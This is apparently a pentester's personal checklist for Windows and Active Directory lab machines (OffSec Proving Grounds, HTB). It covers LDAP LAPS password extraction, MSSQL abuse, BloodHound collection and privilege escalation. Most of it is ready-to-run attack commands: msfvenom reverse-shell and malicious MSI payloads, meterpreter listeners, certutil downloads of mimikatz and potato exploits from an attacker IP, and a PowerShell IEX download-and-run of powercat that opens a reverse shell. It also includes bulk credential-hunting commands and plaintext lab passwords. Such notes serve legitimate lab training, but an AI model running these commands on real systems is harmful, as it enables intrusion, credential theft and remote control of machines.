ldapsearch -x -H ldap://192.168.102.227 -D '' -w '' -b "DC=nagoya-industries,DC=com" -v  | tee ldapsearch-Intial-Report.txt
```

- [ ] pipe all the data to a file and thenb get the anomolies
```
ldapsearch -x -H ldap://10.129.124.61 -b "DC=cascade,DC=local" "(objectClass=user)" > tmp.txt 
```
```
cat tmp.txt| awk '{print $1}' | sort | uniq -c | sort -n
```


### ldap With valid creds - Can we get the ms-MCS-AdmPwd password? 
- **Microsoft - Management Console Services - Administrator Password**

**!!! 🚨 Note**": The username format may have to be **in either format: USERNAME@bossingit.biz, or bossingit.biz/USERNAME** ('Fiona.Clark@nagoya-industries.com' or 'nagoya-industries.com/Fiona.Clark')

- [ ] With valid creds **Can we get the admins password?** - `ms-MCS-AdmPwd` is effectivly [LAPS](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html?highlight=LAPS#laps)
```
ldapsearch -v -x -D "fmcsorley@HUTCH.OFFSEC" -w "CrabSharkJellyfish192" -b "DC=hutch,DC=offsec" -H ldap://192.168.102.227 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
OR get it all 
```
ldapsearch -v -x -D "fmcsorley@HUTCH.OFFSEC" -w "CrabSharkJellyfish192" -b "DC=hutch,DC=offsec" -H ldap://192.168.102.227 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


Always Try for the Administrator Password (as Hutch PG) - Getting immidiate shell is not always the privesc path
```
ldapsearch -x -H 'ldap://192.168.102.227' -D 'bossingit.biz\USERNAME' -w 'PASSWORD' -b 'dc=hutch,dc=offsec' "(MS-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
- `ldapsearch -v -x -D "fmcsorley@HUTCH.OFFSEC" -w "CrabSharkJellyfish192" -b "DC=hutch,DC=offsec" -H ldap://192.168.240.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`





- [ ] Check Laps enabled so we can get the admin password?
```
nxc ldap 192.168.102.227 -u fmcsorley -p 'CrabSharkJellyfish192' -M laps
```

- [ ] Check if ADCS is enable with valid creds
```
nxc ldap 192.168.102.227 -u 'boss' -p '' -M adcs
```

- [ ] Get the domain SID
```
nxc ldap 192.168.102.227 -u VALID_USER -p 'PASSWORD' --get-sid
```



- [ ] run Bloodhound ( this is silent and will produce a bunch of jsons file)
```
nxc ldap hokkaido-aerospace.com -u hrapp-service -p 'Untimed$Runny' --bloodhound -c all --dns-server 192.168.102.227
```

Bloodhound with netexec ( BUT NOT AS GOOD AS SHARP HOUND)
```
nxc ldap dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --bloodhound --collection ALL --dns-server 192.168.102.227
```


- [ ] zip upop all the json files
```
zip AD-BH-info.zip *.json  # zip up all the json files from BH-Python
```

credentials
- [ ] Rev shell seems right but fails - check a familiar port
- [ ] Rev shell is loaded on a http, **trigger on http** not https

```
xfreerdp3 /v:192.168.102.227 /u:"inlanefreight\svc_sql" /p:"lucky7" /dynamic-resolution /drive:Shared,/home/kali/Tools/ImmidiateTools
```

## 443
Insepct the cirts in more details
```
echo | openssl s_client -showcerts -servername 192.168.102.227 -connect 192.168.102.227:443 2>/dev/null | openssl x509 -inform pem -noout -text
```


## [MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=mssql#mssql-privilege-escalation)

- [ ] If we have creds and 
```
nxc mssql 192.168.102.227 -u USERNAME -p 'Start12PASSWORD' -M mssql_priv
```
```
nxc mssql 192.168.102.227 -u discovery -p 'Start123!' -M mssql_coerce -o LISTENER=LOCAP_IP:4444 
```

See if we can impersonate any other users ( like in OFfsec Hokkaido)
```
nxc mssql 192.168.102.227 -u discovery -p 'Start123!' -M enum_impersonate
```

Then : 

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

```
impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@192.168.102.227
```

```
sqlite3 <DATABASE_FILE>.db .dump       				# sql will dump all the data in the cli

```

### Tools
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=443 -f exe > shell4.exe
```
```
certutil -urlcache -split -f http://192.168.45.202/shell43.exe C:\Windows\tasks\shell43.exe
certutil -urlcache -split -f http://192.168.45.202/GodPotato-NET4.exe
certutil -urlcache -split -f http://192.168.45.202/Invoke-Kerberoast.ps1
certutil -urlcache -split -f http://192.168.45.202/accesschk.exe
certutil -urlcache -split -f http://192.168.45.202/mimikatz.exe
certutil -urlcache -split -f http://192.168.45.202/FILE.ps1
certutil -urlcache -split -f http://192.168.45.202/PrintSpoofer64.exe
certutil -urlcache -split -f http://192.168.45.202/winPEASany.exe
certutil -urlcache -split -f http://192.168.45.202/foo.txt
certutil -urlcache -split -f http://192.168.45.202/shell4.exe
certutil -urlcache -split -f http://192.168.45.202/Inveigh.exe
certutil -urlcache -split -f http://192.168.45.202/SharpGPOAbuse.exe
certutil -urlcache -split -f http://192.168.45.202/s43.exe

iwr -uri http://192.168.102.227/winPEASany.exe -Outfile winPEASany.exe
xfreerdp3  /u:'hacker' /p:'Tuesday@2' /v:192.168.102.227 /smart-sizing /size:1920x1080 /compression /auto-reconnect /tls:seclevel:0  /cert:ignore /drive:kali,.
https://github.com/lefayjey/linWinPwn   - to experiment
```
#### Meterpreter listener
- [ ] Windows listener
```
msfconsole -q -x "use exploit/multi/handler; set LHOST 192.168.45.202; set LPORT 4444; set payload windows/x64/meterpreter/reverse_https; run"
```
- [ ] Linux listener
```
msfconsole -q -x "use exploit/multi/handler; set LHOST 192.168.45.202; set LPORT 4444; set payload linux/x64/meterpreter/reverse_https; run"
```

# Password BruteForcing (IF you have too)
### Start with these lists first before rockyou.txt

Get Delta between different password lists
```
comm -23 <(sort -u new_list.txt) <(cat old_list1.txt old_list2.txt old_list3.txt | sort -u) > delta.txt
```

```
/usr/share/seclists/Passwords/corporate_passwords.txt
```
USed on - Nagoya 

```
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
```
```
/usr/share/seclists/Passwords/cirt-default-passwords.txt
```


```
/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
```

```
/usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt
```
```
/usr/share/seclists/Passwords/darkweb2017-top1000.txt 
```

```
/usr/share/wordlists/metasploit/unix_passwords.txt
```

## Getting a Reverse shell
- [ ] `Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.102.227/powercat.ps1');powercat -c 192.168.102.227 -p 445 -e cmd"`
# Foothold -  Windows Privilege Escalation
## Resources
- [[PE Enumeration]]
- [[PE Attacks]]
- [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [Hacktricks Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

## Fundamentals
**Token Abuse**
- [ ] `whoami /all` 
	- [ ] `SeImpersonatePrivilege`
	- [ ] Use `PrintSpoofer` or `GodPotato`
	- [ ] If not try `SweetPotato.exe` (Sharp Collection)
- [ ] Check Tasks list `CP:> tasklist`
- [ ] Check both Program Files\ for any interesting software eg **LAPS**
	- [ ] `CP:> cd \Program Files\` and `dir`  to see if anything is aoput of the ordinary
- [ ] `findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml`       -- START like this and keep it simple , then look for txt etc  ( OFFSEC PG : Mice )


 - [ ]  **Check AlwaysInstallElevated Registry** `CP:>`
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- [ ] if returns with `0x1` means that .msi files (_Microsoft Software Installer_) are automatically installed with Administrative privileges. - **One Shot!!**
	- [ ]  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=LOCAL_PORT -f msi -o evil.msi`
	- [ ] `msiexec /quiet /qn /i C:\Windows\Temp\evil.msi` 


Meterpreter multihandler payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=443 -f exe > shellM443.exe
```


----


- [ ] **Get context, users, groups**
	- [ ] `whoami`
	- [ ] `whoami /all` 
	- [ ] `net user` 
	- [ ] `net group` 
	- [ ] `whoami /groups`
	- [ ] `Get-LocalGroupMember <GROUPNAME>`
	- [ ] P:> `Get-LocalUser`
	- [ ] Check Member of the "Event Log Readers" Run: `Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt` See what powershell commands etc have bee nrun especially and Base64 blobs - Offsec PG: Comprimised


- [ ]  **Check for tokens/privileges**
- `whoami /priv` >> 
	- [ ]  If `SeImpersonatePrivilege` - Potato or PrintSPoofer
	- [ ]  If `SeManageVolumePrivilege` PE `SeManageVolumeExploit.exe` via [this exploit](https://github.com/xct/SeManageVolumeAbuse) - (Caution: Picky about run location Offsec "Access")
- [ ] **Check registry keys**
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` >> `0x1`
- [ ]  **Check for cached creds**
- `cmdkey /list`
- [ ]  **Check PowerShell History**
	- [ ] `(Get-PSReadlineOption).HistorySavePath`
- [ ]  **Check running services for Unquoted or Non-default locations**
	- [ ] 32bit P:> `Get-CimInstance -ClassName win32_service | Select Name, State, StartName, PathName | Where-Object {$_.State -like 'Running'}`
	- [ ]  64bit P:> `Get-Service | Select Name,Status,PathName | Where-Object {$_.Status -like 'Running'}` 
- [ ] File Permission: issues look for 32/64 Binaries with Weak and Dangerous permissions which we could replace to H-PE
```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -eq 'Running' } | ForEach-Object {
    $svc = $_
    $rawPath = $svc.PathName -replace '"',''
    $exePath = $rawPath -replace '\s.*',''
    
    if (Test-Path $exePath) {
        $acl = Get-Acl $exePath
        [PSCustomObject]@{
            Service     = $svc.Name
            StartName   = $svc.StartName
            Path        = $exePath
            Owner       = $acl.Owner
            Dangerous   = $acl.Access | Where-Object {
                ($_.FileSystemRights -match 'Write' -or $_.FileSystemRights -match 'FullControl' -or $_.FileSystemRights -match 'Modify') -and
                ($_.IdentityReference -match 'Users' -or $_.IdentityReference -match 'Everyone' -or $_.IdentityReference -match 'Authenticated Users')
            }
        }
    }
}
```

- [ ] **Check for non-default binaries looking for .dll files (like log files too)**
- `C:\TEMP\???` `C:\Users\user\???` `C:\backup\???` etc
- [ ] **Check for useful files in User's directory**
- `Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
- `*.log` `*.kdbx` `*.xml` literally any weird files in user's directory
- [ ] **Check for scheduled tasks run by higher level**
	- [ ] `Get-ScheduledTask` 
	- [ ] C:> `schtasks /query /fo LIST /v`
- [ ] **Check for database files**
	-  [ ] `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- [ ] **Check for config files**
	- [ ] `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- [ ] **Check installed packages**
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion`
- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion`

**Other things** 
- [x] Check for user startup applications
	- [ ] `CP:> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- [ ] Check for system-wide startup applications
	- [ ] `CPa:> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- [ ] Check for stored plaintext credentials
	- [ ] `CPa:> reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`
- [ ] Enumerate Windows services
	- [ ] `CPa:> reg query HKLM\SYSTEM\CurrentControlSet\Services`
- [ ] Check LSA for authentication configurations
	- [ ] `CPa:> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
- [ ] Check RDP session history
	- [ ] `CP:> reg query HKCU\Software\Microsoft\Terminal Server Client\Servers`
- [ ] Look for user environment variable persistence
	- [ ] `CP:> reg query HKCU\Environment`
- [ ] Identify policies affecting user security
	- [ ] `CPa:> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
- [ ] List all subkeys under a specific hive
	- [ ] `CPa:> reg query HKLM\SYSTEM /s`
### [System Info](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#system-info)
- [ ]  Obtain [**System information**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#system-info)
	- [ ] `systeminfo`
	- [ ] List the patches
		- [ ] `wmic qfe get Caption,Description,HotFixID,InstalledOn` - List the patches
		- [ ] `P:> `Get-HotFix | Sort-Object InstalledOn`
- [ ]  Interesting info in [**env vars**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#environment)?
	- [ ] `C:> dir env:`
	- [ ] `P:> Get-ChildItem Env:`
- [ ]  Passwords in [**PowerShell history**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#powershell-history)?
	- [ ]  `P:> Get-History`
	- [ ]  `P:> (Get-PSReadlineOption).HistorySavePath`
- [ ]  Interesting info in [**Internet settings**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#internet-settings)?
- [ ]  [**Drives**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drives)?
	- [ ] `CP:> wmic logicaldisk get caption,description,providername`
- [ ]  [**WSUS exploit**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus)?
- [ ]  [**AlwaysInstallElevated**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated)?
	- [ ] `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	- [ ] `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ]  Search for **kernel** [**exploits using scripts**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits)
- [ ]  Use **Google to search** for kernel **exploits**
- [ ]  Use **searchsploit to search** for kernel **exploits**

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#network)[Network](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)
- [ ]  Check **current** [**network** **information**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)
- [ ]  Check **hidden local services** restricted to the outside

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#running-processes)[Running Processes](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes)
- [ ]  Processes binaries [**file and folders permissions**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#file-and-folder-permissions)
- [ ]  [**Memory Password mining**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#memory-password-mining)
- [ ]  [**Insecure GUI apps**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#insecure-gui-apps)
- [ ]  Steal credentials with **interesting processes** via `ProcDump.exe` ? (firefox, chrome, etc ...)

### [Services](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services)
- [ ]  [Can you **modify any service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#permissions)
	- [ ] Get a list of the service paths `\C:>`
``` 
 sc query state= all | findstr "SERVICE_NAME:" > services.txt & for /f "tokens=2 delims=: " %i in (services.txt) do @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
- [ ]  `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ `
- [ ]  [Can you **modify** the **binary** that is **executed** by any **service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#modify-service-binary-path)
- [ ]  [Can you **modify** the **registry** of any **service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions)
- [ ]  [Can you take advantage of any **unquoted service** binary **path**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths)
1. Search for all unquoted service paths with spaces in them 
	1. 
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
	1. C:> 
```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
	1. Once we identify a candidate service path, can we restart it without a reboot?

1. Maybe juts look for processes which start automatically:
- [ ] `wmic service get name,displayname,pathname,startmode |findstr /i "auto"`


```
PS C:\Users\steve> Start-Service <SERVICENAME>
PS C:\Users\steve> Stop-Service <SERVICENAME>
```
	1. Check the path permissions : `icacls <PATH_TO_EXECUTABLE>`
	2. Replace the binary and profit


### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#applications)[**Applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications)
- [ ]  **Write** [**permissions on installed applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#write-permissions)
- [ ]  [**Startup Applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#run-at-startup)
- [ ]  **Vulnerable** [**Drivers**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#dll-hijacking)[DLL Hijacking](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#path-dll-hijacking)
- [ ]  Can you **write in any folder inside PATH**?
- [ ]  Is there any known service binary that **tries to load any non-existant DLL**?
- [ ]  Can you **write** in any **binaries folder**?
1. Find Installed Applications:
	 1.  32Bit PS:>`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, InstallLocation`
	 2. 64Bit Ps:> `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, InstallLocation`
	 3. 
```
PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#network-1)[Network](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)
- [ ]  Enumerate the network (shares, interfaces, routes, neighbours, ...)
- [ ]  Take a special look at network services listening on localhost (127.0.0.1)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#windows-credentials)[Windows Credentials](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#windows-credentials)
- [ ]  [**Winlogon**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#winlogon-credentials) credentials
- [ ]  [**Windows Vault**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager-windows-vault) credentials that you could use?
- [ ]  Interesting [**DPAPI credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi)?
  - [ ]  See Dedicated Checeklist Template file on DPAPI decryption with impacket
- [ ]  Passwords of saved [**Wifi networks**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wifi)?
- [ ]  Interesting info in [**saved RDP Connections**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#saved-rdp-connections)?
- [ ]  Passwords in [**recently run commands**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#recently-run-commands)?
- [ ]  [**Remote Desktop Credentials Manager**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager) passwords?
- [ ]  [**AppCmd.exe** exists](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmd-exe)? Credentials?
- [ ]  [**SCClient.exe**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient-sccm)? DLL Side Loading?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#files-and-registry-credentials)[Files and Registry (Credentials)](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials)
- [ ] Looked here and every where for interesting Hidden Files ? 
	- [ ] `C:> dir /a:H`
	- [ ] `C:> dir C:\Users\*.txt /a /s > hidden_txt_files.txt`
	- [ ] `P:> Get-ChildItem -Force -Recurse`
- [ ]  [**SSH keys in registry**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry)?
	- [ ] NA

- [ ]  Any [**SAM & SYSTEM**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#sam-and-system-backups) backup?
- [ ] **Putty:** [**Creds**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#putty-creds) 
	- [ ] `C:> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
- [ ] [**SSH host keys**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#putty-ssh-host-keys)
	- [ ] `CP:> reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\`




**Basic Text Files (.txt)**
- [ ] `C:> dir C:\*.txt /s /b /a > "C:\Windows\Tasks\BasicText_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -eq ".txt" } | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\BasicText_File_Enumeration.txt"`
**Build Scripts (*build.ps1)**
- [ ] `C:> dir C:\*build.ps1 /s /b /a > "C:\Windows\Tasks\BuildScripts_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -Include *build.ps1 -ErrorAction SilentlyContinue 2>$null | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\BuildScripts_File_Enumeration.txt"`
**Office & Document Files (.doc, .docx, .xls, .xlsx, .pdf, .ppt, .pptx)**
- [ ] `C:> dir C:\*.doc C:\*.docx C:\*.xls C:\*.xlsx C:\*.pdf C:\*.ppt C:\*.pptx /s /b /a > "C:\Windows\Tasks\Docs_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".doc",".docx",".xls",".xlsx",".pdf",".ppt",".pptx" } | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\Docs_File_Enumeration.txt"`
**Password Vaults & Similar (.kdbx, .cred, .keychain, .key, .vnc, .pcap)**
- [ ] `C:> dir C:\*.kdbx C:\*.cred C:\*.keychain C:\*.key C:\*.vnc C:\*.pcap /s /b /a > "C:\Windows\Tasks\Vaults_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".kdbx",".cred",".keychain",".key",".vnc",".pcap" } | Select-Object -ExpandProperty FullName| Out-File "C:\Windows\Tasks\Vaults_File_Enumeration.txt"`
**Database & Backup Files (.db, .sqlite, .bak, .backup, .sql, .mdb, .accdb)**
- [ ] `C:> dir C:\*.db C:\*.sqlite C:\*.bak C:\*.backup C:\*.sql C:\*.mdb C:\*.accdb /s /b /a > "C:\Windows\Tasks\Database_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".db",".sqlite",".bak",".backup",".sql",".mdb",".accdb" } | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\Database_File_Enumeration.txt"` 

```
dir /s /b *.sqlite        - search for SQLite databases (e.g., Sticky Notes, browsers)
dir /s /b *.mdb           - search for Access databases
dir /s /b *.accdb         - search for newer Access database format
dir /s /b *.db            - search for generic database files (used by various apps)
dir /s /b *.db3           - search for SQLite variant used in some mobile/legacy apps
dir /s /b *.sdf           - search for SQL Server Compact databases
dir /s /b *.ldf           - search for SQL Server transaction logs
dir /s /b *.mdf           - search for SQL Server main database files
dir /s /b *.nsf           - search for Lotus Notes database files
dir /s /b *.fdb           - search for Firebird DBs (used by some enterprise apps)
dir /s /b *.edb           - search for Exchange or Windows Search databases
```


**Config & Log Files (.conf, .cfg, .ini, .log, .xml, .yml, .yaml, web.config, app.config)**
- [ ] `C:> dir C:\*.conf C:\*.cfg C:\*.ini C:\*.log C:\*.xml C:\*.yml C:\*.yaml C:\web.config C:\app.config /s /b /a > "C:\Windows\Tasks\ConfigLog_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".conf",".cfg",".ini",".log",".xml",".yml",".yaml" -or $_.Name -in "web.config","app.config" } | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\ConfigLog_File_Enumeration.txt"`  
**Keys & Certificates (.pem, .key, .pfx, .p12, .csr, .der, id_rsa, id_dsa)**
- [ ] `C:> dir C:\*.pem C:\*.key C:\*.pfx C:\*.p12 C:\*.csr C:\*.der C:\id_rsa C:\id_dsa /s /b /a > "C:\Windows\Tasks\Keys_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".pem",".key",".pfx",".p12",".csr",".der" -or $_.Name -in "id_rsa","id_dsa" } | Select-Object -ExpandProperty FullName | Out-File "C:\Windows\Tasks\Keys_File_Enumeration.txt"`
**Script Files (.ps1, .bat, .cmd, .sh, .plist)**
- [ ] `C:> dir C:\*.ps1 C:\*.bat C:\*.cmd C:\*.sh C:\*.plist /s /b /a > "C:\Windows\Tasks\Scripts_File_Enumeration.txt" 2>nul`
- [ ] `PS:> Get-ChildItem -Path C:\ -Force -File -Recurse -ErrorAction SilentlyContinue 2>$null | Where-Object { $_.Extension -in ".ps1",".bat",".cmd",".sh",".plist" } | Select-Object -ExpandProperty FullName| Out-File "C:\Windows\Tasks\Scripts_File_Enumeration.txt"`
- [ ] Passwords in [**unattended files**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unattended-files)? (for automated installation of the OS)
	- [ ]  `CP:> type C:\Windows\sysprep\sysprep.xml`
	- [ ]  `CP:> type C:\Windows\sysprep\sysprep.inf`
	- [ ]  `CP:> type C:\Windows\sysprep.inf`
	- [ ]  `CP:> type C:\Windows\Panther\Unattended.xml`
	- [ ]  `CP:> type C:\Windows\Panther\Unattend.xml`
	- [ ]  `CP:> type C:\Windows\Panther\Unattend\Unattend.xml`
	- [ ]  `CP:> type C:\Windows\Panther\Unattend\Unattended.xml`
	- [ ]  `CP:> type C:\Windows\System32\Sysprep\unattend.xml`
	- [ ]  `CP:> type C:\Windows\System32\Sysprep\unattended.xml`
	- [ ]  `CP:> type C:\unattend.txt`
	- [ ]  `CP:> type C:\unattend.inf`
	- [ ]  `CP:> type dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`
- [ ]  [**Cloud credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cloud-credentials)?
- [ ]  [**McAfee SiteList.xml**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#mcafee-sitelist.xml) file?
- [ ]  [**Cached GPP Password**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-gpp-pasword)?
- [ ]  Password in [**IIS Web config file**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#iis-web-config)?
- [ ]  Interesting info in [**web** **logs**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#logs)?
- [ ]  Do you want to [**ask for credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ask-for-credentials) to the user?
- [ ]  Interesting [**files inside the Recycle Bin**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-in-the-recyclebin)?
- [ ]  Other [**registry containing credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry)?
- [ ]  Inside [**Browser data**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history) (dbs, history, bookmarks, ...)?
- [ ]  [**Generic password search**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#generic-password-search-in-files-and-registry) in files and registry
- [ ]  [**Tools**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#tools-that-search-for-passwords) to automatically search for passwords


